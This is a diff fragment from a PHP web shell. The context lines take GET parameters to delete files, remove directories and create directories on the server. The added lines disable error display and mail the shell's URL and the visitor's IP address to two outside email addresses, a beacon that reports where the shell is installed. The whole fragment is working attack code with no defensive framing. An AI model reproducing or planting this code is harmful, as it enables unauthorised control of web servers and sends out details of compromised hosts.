@@ -250,4 +250,14 @@ if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($
 <?php }else{if(isset($_GET['delete']) && ($_GET['delete'] != "")){$file = $_GET['delete'];@unlink($file);} 
 elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));}
 elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){$path = $pwd.$_GET['mkdir'];@mkdir($path);}$buff = showdir($pwd,$prompt);echo $buff;}
-?></div></body></html>
+?></div></body></html><?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$to = 'lambangwes@gmail.com, mrhorden007@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
